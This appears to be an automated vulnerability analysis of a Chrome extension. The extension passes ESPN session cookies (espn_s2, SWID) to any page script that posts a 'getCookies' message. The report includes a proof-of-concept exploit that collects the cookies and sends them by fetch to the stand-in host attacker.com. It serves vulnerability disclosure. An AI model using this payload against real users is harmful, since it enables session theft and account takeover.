# CoCo Analysis: pihcdhfppicgkfdoemcancnklfkdiodg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cookie_source → window_postMessage_sink

**CoCo Trace:**
CoCo detected a flow from cookie_source to window_postMessage_sink but did not provide specific line numbers in the trace.

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener('message', (event) => {
    // Webpage can trigger this by posting: {action: 'getCookies'}
    if (event.origin === window.location.origin && event.data.action === 'getCookies') {
        chrome.runtime.sendMessage({ action: "getCookies" }, function (response) {
            // ← response.cookies contains sensitive cookie data from background
            window.postMessage({ action: "cookieData", cookies: response.cookies }, event.origin); // ← attacker receives cookies
        });
    }
});

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.action === "getCookies") {
        Promise.all([
            getCookie("https://www.espn.com", "espn_s2"),  // ← Fetch sensitive cookies
            getCookie("https://www.espn.com", "SWID")      // ← Fetch sensitive cookies
        ]).then(cookies => {
            const validCookies = cookies.filter(cookie => !cookie.error);
            sendResponse({ cookies: validCookies });  // ← Send cookies back to content script
        });
        return true;
    }
});

function getCookie(url, name) {
    return new Promise((resolve, reject) => {
        chrome.cookies.get({ url: url, name: name }, function (cookie) {  // ← Cookie source
            if (cookie) {
                resolve({ name: name, value: cookie.value });
            } else {
                reject(new Error(`Cookie ${name} not found at ${url}`));
            }
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage

**Attack:**

```javascript
// On any webpage that has this extension's content script injected
// (matches: *://*.espn.com/*, localhost:44355, *://*.fantasyadvisor.com/*, etc.)
window.postMessage({ action: 'getCookies' }, window.location.origin);

// Listen for the response with sensitive cookies
window.addEventListener('message', (event) => {
    if (event.data.action === 'cookieData') {
        console.log('Stolen cookies:', event.data.cookies);
        // Attacker can exfiltrate ESPN session cookies (espn_s2, SWID)
        // Send to attacker server:
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(event.data.cookies)
        });
    }
});
```

**Impact:** Information disclosure - malicious webpages on ESPN.com or other matched domains can steal sensitive ESPN session cookies (espn_s2 and SWID), allowing account takeover of user's ESPN account.
